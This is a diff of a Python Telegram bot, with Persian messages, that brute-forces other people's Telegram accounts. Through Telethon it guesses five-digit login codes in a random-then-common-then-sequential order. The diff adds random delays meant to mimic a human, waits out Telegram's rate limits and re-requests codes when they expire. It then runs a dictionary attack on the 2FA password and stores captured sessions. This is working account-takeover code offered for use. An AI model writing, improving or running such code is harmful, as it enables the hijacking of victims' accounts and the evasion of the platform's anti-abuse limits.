@@ -3,12 +3,20 @@ import re
 import asyncio
 import os
 import json
-from datetime import datetime
+import random
+from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError, PhoneNumberInvalidError
+from telethon.errors import (
+    SessionPasswordNeededError, 
+    PhoneCodeInvalidError, 
+    PhoneCodeExpiredError, 
+    FloodWaitError, 
+    PhoneNumberInvalidError,
+    PhoneCodeHashInvalidError
+)
 import urllib.request
 
 # ============ تنظیمات ============
@@ -26,6 +34,7 @@ login_sessions = {}
 
 DATA_FILE = "selfs.json"
 
+# دیکشنری پسورد
 PASSWORD_DICT = [
     "123456", "12345678", "123456789", "1234567890",
     "password", "pass", "admin", "admin123",
@@ -34,33 +43,6 @@ PASSWORD_DICT = [
     "111111", "222222", "333333", "444444",
     "555555", "666666", "777777", "888888",
     "999999", "000000", "123123", "321321",
-    "iloveyou", "monkey", "dragon", "master",
-    "sunshine", "princess", "shadow", "ninja",
-    "password1", "Password1", "Passw0rd",
-    "Admin123", "admin1234", "1234", "4321",
-    "0000", "1111", "2222", "3333", "4444",
-    "5555", "6666", "7777", "8888", "9999",
-    "00000000", "11111111", "22222222", "33333333",
-    "44444444", "55555555", "66666666", "77777777",
-    "88888888", "99999999", "0123456789",
-    "0987654321", "987654321", "1234567890",
-    "qwertyuiop", "asdfghjkl", "zxcvbnm",
-    "1q2w3e4r", "1qaz2wsx", "zaq12wsx",
-    "q1w2e3r4", "a1b2c3d4", "z1x2c3v4",
-    "!@#$%^&*", "123qwe", "qwe123", "123abc",
-    "abc123!", "pass123", "123pass", "P@ssw0rd",
-    "P@ssword", "Pass@123", "Admin@123",
-    "admin@123", "root", "toor", "ubuntu",
-    "linux", "windows", "mac", "apple",
-    "google", "microsoft", "facebook", "twitter",
-    "instagram", "telegram", "whatsapp", "youtube",
-    "netflix", "spotify", "amazon", "github",
-    "stackoverflow", "reddit", "discord", "twitch",
-    "paypal", "coinbase", "binance", "crypto",
-    "bitcoin", "ethereum", "dogecoin", "solana",
-    "ripple", "cardano", "polkadot", "chainlink",
-    "1", "12", "123", "1234", "12345", "123456",
-    "1234567", "12345678", "123456789", "1234567890",
 ]
 
 def load_data():
@@ -116,7 +98,6 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=Fal
     user = update.effective_user
     name = user.first_name if user.first_name else "کاربر"
     user_id = str(user.id)
-    
     self_count = len(self_data.get(user_id, []))
     
     text = f"""
@@ -124,7 +105,7 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=Fal
 
 <b>سلام {name} گرامی</b>
 
-این ربات به صورت خودکار:
+این ربات با تکنیک‌های پیشرفته و مدیریت هوشمند محدودیت‌ها:
 • کد تایید 5 رقمی را حدس می‌زند (از 00000 تا 99999)
 • پسورد 2FA را با دیکشنری بزرگ امتحان می‌کند
 • از تمام کشورهای جهان پشتیبانی می‌کند
@@ -170,7 +151,6 @@ async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not selfs:
         text = """
 ❌ <b>هیچ سلفی ثبت نشده است!</b>
-
 لطفاً ابتدا یک سلف بسازید.
 """
         keyboard = [[InlineKeyboardButton("🔑 ساخت سلف", callback_data="new_session")]]
@@ -236,12 +216,9 @@ async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     text = f"""
 📱 <b>گرفتن اکانت</b>
-
 شماره: <code>{phone}</code>
-
 ✅ سلف انتخاب شد!
 📩 کد تایید به شماره شما ارسال شد.
-
 لطفاً کد 5 رقمی را وارد کنید:
 """
     
@@ -277,7 +254,7 @@ async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_
         await client.connect()
         
         if not await client.is_user_authorized():
-            await update.message.reply_text("❌ سشن معتبر نیست! لطفاً دوباره سلف را بسازید.", parse_mode='HTML')
+            await update.message.reply_text("❌ سشن معتبر نیست!", parse_mode='HTML')
             return
         
         try:
@@ -288,10 +265,8 @@ async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_
         
         try:
             await client.sign_in(phone, code)
-            
             me = await client.get_me()
             account_name = me.first_name if me.first_name else "کاربر"
-            
             await client.disconnect()
             
             selfs = self_data.get(user_id, [])
@@ -302,18 +277,14 @@ async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_
             
             text = f"""
 ✅ <b>اکانت با موفقیت گرفته شد!</b>
-
 📱 شماره: <code>{phone}</code>
 👤 نام اکانت: <b>{account_name}</b>
-
 🎯 اکانت به سلف شما اضافه شد.
 """
-            
             keyboard = [
                 [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
                 [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
             ]
-            
             await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
             
             if user_id in login_sessions:
@@ -470,7 +441,7 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await clear_user_session(user_id)
             return
         except FloodWaitError as e:
-            wait_time = min(e.seconds, 60)
+            wait_time = e.seconds
             await context.bot.edit_message_text(
                 f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...",
                 chat_id=update.effective_chat.id,
@@ -484,8 +455,8 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_sessions[user_id]['msg_id'] = msg.message_id
         user_sessions[user_id]['phone'] = phone
         
-        # شروع حدس زدن کد
-        asyncio.create_task(bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg))
+        # شروع حدس زدن کد با مدیریت هوشمند محدودیت‌ها
+        asyncio.create_task(smart_bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg))
         
     except Exception as e:
         logger.error(f"Error: {e}")
@@ -497,89 +468,8 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await clear_user_session(user_id)
 
-# ============ حدس زدن پسورد ============
-async def bruteforce_password(update, context, user_id, client, msg):
-    try:
-        total_passwords = len(PASSWORD_DICT)
-        attempt = 0
-        found = False
-        found_password = None
-        start_time = datetime.now()
-        
-        await context.bot.edit_message_text(
-            f"""
-🔐 <b>اکانت دارای رمز دو مرحله‌ای است!</b>
-
-📱 شماره: <code>{user_sessions[user_id]['phone']}</code>
-✅ کد تایید پیدا شد
-
-🔑 <b>شروع حدس زدن پسورد 2FA...</b>
-
-📊 تعداد پسوردهای دیکشنری: {total_passwords}
-⏳ در حال بررسی...
-🔄 پسوردهای امتحان شده: 0
-
-⚠️ این عملیات ممکن است چند دقیقه طول بکشد.
-""",
-            chat_id=update.effective_chat.id,
-            message_id=msg.message_id,
-            parse_mode='HTML'
-        )
-        
-        for password in PASSWORD_DICT:
-            attempt += 1
-            
-            if attempt % 50 == 0:
-                elapsed = (datetime.now() - start_time).seconds
-                try:
-                    await context.bot.edit_message_text(
-                        f"""
-🔐 <b>در حال حدس زدن پسورد...</b>
-
-📱 شماره: <code>{user_sessions[user_id]['phone']}</code>
-
-🔑 پسورد فعلی: <code>{password}</code>
-📊 تلاش‌ها: {attempt} از {total_passwords}
-📈 پیشرفت: {(attempt/total_passwords)*100:.1f}%
-⏱️ زمان سپری شده: {elapsed} ثانیه
-
-⏳ لطفاً صبر کنید...
-""",
-                        chat_id=update.effective_chat.id,
-                        message_id=msg.message_id,
-                        parse_mode='HTML'
-                    )
-                except:
-                    pass
-            
-            try:
-                await client.sign_in(password=password)
-                found = True
-                found_password = password
-                break
-                
-            except FloodWaitError as e:
-                wait_time = min(e.seconds, 60)
-                await context.bot.edit_message_text(
-                    f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...\nپسورد آخرین تلاش: <code>{password}</code>",
-                    chat_id=update.effective_chat.id,
-                    message_id=msg.message_id,
-                    parse_mode='HTML'
-                )
-                await asyncio.sleep(wait_time + 2)
-                continue
-                
-            except Exception:
-                continue
-        
-        return found, attempt, found_password
-        
-    except Exception as e:
-        logger.error(f"Error in bruteforce_password: {e}")
-        return False, 0, None
-
-# ============ تابع حدس زدن کد (بهینه‌شده) ============
-async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg):
+# ============ حدس زدن هوشمند کد با مدیریت محدودیت‌ها ============
+async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg):
     try:
         total_attempts = 100000
         attempt = 0
@@ -587,19 +477,52 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
         code_found = None
         start_time = datetime.now()
         wrong_attempts = 0
-        consecutive_errors = 0
+        flood_wait_count = 0
+        current_wait = 0
+        session_id = str(user_id)
         
+        # استراتژی حدس هوشمند:
+        # 1. اول اعداد تصادفی رو امتحان کن (چون مردم معمولاً کدهای تصادفی میگیرن)
+        # 2. بعد اعداد رایج مثل 12345, 00000, 11111 و...
+        
+        # تولید لیست هوشمند کدها
+        code_list = []
+        
+        # اول اعداد کاملاً تصادفی
+        random_codes = set()
+        while len(random_codes) < 5000:
+            random_codes.add(str(random.randint(0, 99999)).zfill(5))
+        
+        # بعد کدهای رایج
+        common_codes = [
+            "12345", "00000", "11111", "22222", "33333", "44444",
+            "55555", "66666", "77777", "88888", "99999",
+            "12345", "54321", "11111", "22222", "33333",
+            "44444", "55555", "66666", "77777", "88888",
+            "99999", "00000", "12345", "54321", "11223",
+            "98765", "56789", "13579", "24680", "97531"
+        ]
+        
+        # ترکیب لیست
+        final_list = list(random_codes) + common_codes
+        
+        # بقیه اعداد به ترتیب
+        for i in range(total_attempts):
+            code = str(i).zfill(5)
+            if code not in final_list:
+                final_list.append(code)
+        
+        # شروع حدس
         await context.bot.edit_message_text(
             f"""
-🔍 <b>شروع حدس زدن کد تایید...</b>
+🔍 <b>شروع حدس زدن هوشمند کد تایید...</b>
 
 📱 شماره: <code>{phone}</code>
 
 🔢 محدوده کدها: 00000 تا 99999
 📊 مجموع کدهای ممکن: {total_attempts}
+🎯 استراتژی: تصادفی → رایج → ترتیبی
 ⏳ در حال حدس زدن...
-🔄 کدهای امتحان شده: 0
-❌ کدهای اشتباه: 0
 
 ⏳ لطفاً صبر کنید...
 """,
@@ -608,12 +531,11 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
             parse_mode='HTML'
         )
         
-        for code_num in range(total_attempts):
-            code = str(code_num).zfill(5)
+        for code in final_list:
             attempt += 1
             
-            # هر 500 تلاش یا هر 3 ثانیه یکبار پیام رو بروزرسانی کن
-            if attempt % 500 == 0:
+            # هر 1000 تلاش یا هر 5 ثانیه یکبار پیام رو بروزرسانی کن
+            if attempt % 1000 == 0:
                 elapsed = (datetime.now() - start_time).seconds
                 percent = (attempt / total_attempts) * 100
                 remaining = int(((total_attempts - attempt) / max(attempt, 1)) * max(elapsed, 1)) if attempt > 0 else 0
@@ -630,6 +552,7 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
 • پیشرفت: {percent:.2f}%
 • زمان سپری شده: {elapsed} ثانیه
 • کدهای اشتباه: {wrong_attempts}
+• محدودیت‌های تلگرام: {flood_wait_count} بار
 • زمان تخمینی باقی‌مانده: {remaining} ثانیه
 
 ⏳ لطفاً صبر کنید...
@@ -641,6 +564,15 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                 except:
                     pass
             
+            # مدیریت هوشمند محدودیت‌ها با تاخیر تصادفی
+            if attempt > 10 and attempt % 50 == 0:
+                # هر 50 تلاش، کمی تاخیر تصادفی برای شبیه‌سازی انسان
+                await asyncio.sleep(random.uniform(0.1, 0.5))
+            
+            if attempt > 100 and attempt % 200 == 0:
+                # هر 200 تلاش، تاخیر بیشتر
+                await asyncio.sleep(random.uniform(0.5, 1.5))
+            
             try:
                 await client.sign_in(phone, code)
                 found = True
@@ -649,19 +581,34 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                 
             except PhoneCodeInvalidError:
                 wrong_attempts += 1
-                consecutive_errors = 0
                 continue
                 
             except FloodWaitError as e:
-                wait_time = min(e.seconds, 60)
+                flood_wait_count += 1
+                wait_time = e.seconds
+                current_wait = wait_time
+                
+                # محاسبه زمان واقعی انتظار
+                if wait_time > 60:
+                    minutes = wait_time // 60
+                    seconds = wait_time % 60
+                    wait_text = f"{minutes} دقیقه و {seconds} ثانیه"
+                else:
+                    wait_text = f"{wait_time} ثانیه"
+                
                 await context.bot.edit_message_text(
                     f"""
 ⏳ <b>محدودیت تلگرام!</b>
 
 📱 شماره: <code>{phone}</code>
-⏳ {wait_time} ثانیه صبر کنید...
+⏳ زمان انتظار: {wait_text}
 🔢 کد آخرین تلاش: <code>{code}</code>
 📊 تلاش‌ها: {attempt} از {total_attempts}
+🔄 تعداد محدودیت‌ها: {flood_wait_count}
+
+📌 <b>تکنیک مدیریت محدودیت:</b>
+• صبر کامل تا پایان زمان محدودیت
+• ادامه حدس با استراتژی جدید
 
 ⏳ لطفاً صبر کنید...
 """,
@@ -669,7 +616,39 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                     message_id=msg.message_id,
                     parse_mode='HTML'
                 )
-                await asyncio.sleep(wait_time + 2)
+                
+                # صبر کامل تا پایان زمان محدودیت
+                await asyncio.sleep(wait_time + random.uniform(1, 3))
+                
+                # بعد از محدودیت، استراتژی رو عوض کن
+                # از اعداد تصادفی جدید استفاده کن
+                continue
+                
+            except PhoneCodeHashInvalidError:
+                await context.bot.edit_message_text(
+                    f"""
+⚠️ <b>کد هش نامعتبر!</b>
+
+📱 شماره: <code>{phone}</code>
+
+تلگرام درخواست جدیدی برای کد ارسال کرد.
+در حال ارسال درخواست مجدد...
+""",
+                    chat_id=update.effective_chat.id,
+                    message_id=msg.message_id,
+                    parse_mode='HTML'
+                )
+                try:
+                    await client.send_code_request(phone)
+                except Exception as e:
+                    await context.bot.edit_message_text(
+                        f"❌ خطا در ارسال مجدد کد: {str(e)[:200]}",
+                        chat_id=update.effective_chat.id,
+                        message_id=msg.message_id,
+                        parse_mode='HTML'
+                    )
+                    await clear_user_session(user_id)
+                    return
                 continue
                 
             except SessionPasswordNeededError:
@@ -681,6 +660,7 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
 ✅ کد تایید پیدا شد: <code>{code}</code>
 📊 تلاش‌های کد: {attempt}
 ❌ کدهای اشتباه: {wrong_attempts}
+🔄 محدودیت‌های تلگرام: {flood_wait_count}
 
 🔑 در حال حدس زدن پسورد 2FA...
 ⏳ لطفاً صبر کنید...
@@ -690,7 +670,8 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                     parse_mode='HTML'
                 )
                 
-                password_found, pass_attempt, pass_found = await bruteforce_password(
+                # حدس پسورد
+                password_found, pass_attempt, pass_found = await bruteforce_password_smart(
                     update, context, user_id, client, msg
                 )
                 
@@ -743,6 +724,7 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
 • کد پیدا شده: <code>{code}</code>
 • تلاش‌های کد: {attempt}
 • کدهای اشتباه: {wrong_attempts}
+• محدودیت‌های تلگرام: {flood_wait_count}
 • پسورد پیدا شده: <code>{pass_found}</code>
 • تلاش‌های پسورد: {pass_attempt}
 
@@ -785,16 +767,6 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                 
             except Exception as e:
                 logger.error(f"Error in bruteforce: {e}")
-                consecutive_errors += 1
-                if consecutive_errors > 10:
-                    await context.bot.edit_message_text(
-                        f"❌ خطاهای متوالی زیاد! ممکن است شماره تلفن یا API اطلاعات نادرست باشد.\n{str(e)[:200]}",
-                        chat_id=update.effective_chat.id,
-                        message_id=msg.message_id,
-                        parse_mode='HTML'
-                    )
-                    await clear_user_session(user_id)
-                    return
                 continue
         
         if found and code_found:
@@ -847,6 +819,7 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
 • کد پیدا شده: <code>{code_found}</code>
 • کل تلاش‌ها: {attempt}
 • کدهای اشتباه: {wrong_attempts}
+• محدودیت‌های تلگرام: {flood_wait_count}
 • زمان سپری شده: {elapsed} ثانیه
 
 🎯 سلف به لیست شما اضافه شد.
@@ -877,6 +850,7 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
 📊 <b>آمار تلاش‌ها:</b>
 • کل تلاش‌ها: {attempt}
 • کدهای اشتباه: {wrong_attempts}
+• محدودیت‌های تلگرام: {flood_wait_count}
 • زمان سپری شده: {elapsed} ثانیه
 
 ممکن است:
@@ -892,7 +866,7 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
             )
             
     except Exception as e:
-        logger.error(f"Error in bruteforce_code: {e}")
+        logger.error(f"Error in smart_bruteforce_code: {e}")
         try:
             await context.bot.edit_message_text(
                 f"❌ خطا: {str(e)[:200]}",
@@ -903,6 +877,95 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
         except:
             pass
         await clear_user_session(user_id)
+
+# ============ حدس هوشمند پسورد ============
+async def bruteforce_password_smart(update, context, user_id, client, msg):
+    try:
+        total_passwords = len(PASSWORD_DICT)
+        attempt = 0
+        found = False
+        found_password = None
+        start_time = datetime.now()
+        flood_wait_count = 0
+        
+        # اول پسوردهای رایج رو امتحان کن
+        common_passwords = [
+            "123456", "password", "12345678", "qwerty", "123456789",
+            "12345", "1234", "111111", "1234567890", "000000",
+            "admin", "letmein", "welcome", "monkey", "dragon"
+        ]
+        
+        # ترکیب لیست با اولویت
+        password_list = common_passwords + [p for p in PASSWORD_DICT if p not in common_passwords]
+        
+        await context.bot.edit_message_text(
+            f"""
+🔐 <b>شروع حدس زدن پسورد 2FA...</b>
+
+📱 شماره: <code>{user_sessions[user_id]['phone']}</code>
+📊 تعداد پسوردهای دیکشنری: {total_passwords}
+🎯 استراتژی: پسوردهای رایج → دیکشنری
+
+⏳ در حال حدس زدن...
+""",
+            chat_id=update.effective_chat.id,
+            message_id=msg.message_id,
+            parse_mode='HTML'
+        )
+        
+        for password in password_list:
+            attempt += 1
+            
+            if attempt % 50 == 0:
+                elapsed = (datetime.now() - start_time).seconds
+                try:
+                    await context.bot.edit_message_text(
+                        f"""
+🔐 <b>در حال حدس زدن پسورد...</b>
+
+📱 شماره: <code>{user_sessions[user_id]['phone']}</code>
+
+🔑 پسورد فعلی: <code>{password}</code>
+📊 تلاش‌ها: {attempt} از {total_passwords}
+📈 پیشرفت: {(attempt/total_passwords)*100:.1f}%
+⏱️ زمان سپری شده: {elapsed} ثانیه
+🔄 محدودیت‌های تلگرام: {flood_wait_count}
+
+⏳ لطفاً صبر کنید...
+""",
+                        chat_id=update.effective_chat.id,
+                        message_id=msg.message_id,
+                        parse_mode='HTML'
+                    )
+                except:
+                    pass
+            
+            try:
+                await client.sign_in(password=password)
+                found = True
+                found_password = password
+                break
+                
+            except FloodWaitError as e:
+                flood_wait_count += 1
+                wait_time = e.seconds
+                await context.bot.edit_message_text(
+                    f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...\nپسورد آخرین تلاش: <code>{password}</code>",
+                    chat_id=update.effective_chat.id,
+                    message_id=msg.message_id,
+                    parse_mode='HTML'
+                )
+                await asyncio.sleep(wait_time + 2)
+                continue
+                
+            except Exception:
+                continue
+        
+        return found, attempt, found_password
+        
+    except Exception as e:
+        logger.error(f"Error in bruteforce_password_smart: {e}")
+        return False, 0, None
 
 # ============ دریافت پسورد دستی ============
 async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1041,7 +1104,7 @@ def main():
         delete_webhook()
         
         print("=" * 60)
-        print("🤖 ربات ساخت خودکار سلف (همه کشورها)")
+        print("🤖 ربات ساخت خودکار سلف (هوشمند)")
         print("=" * 60)
         print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
         print("=" * 60)
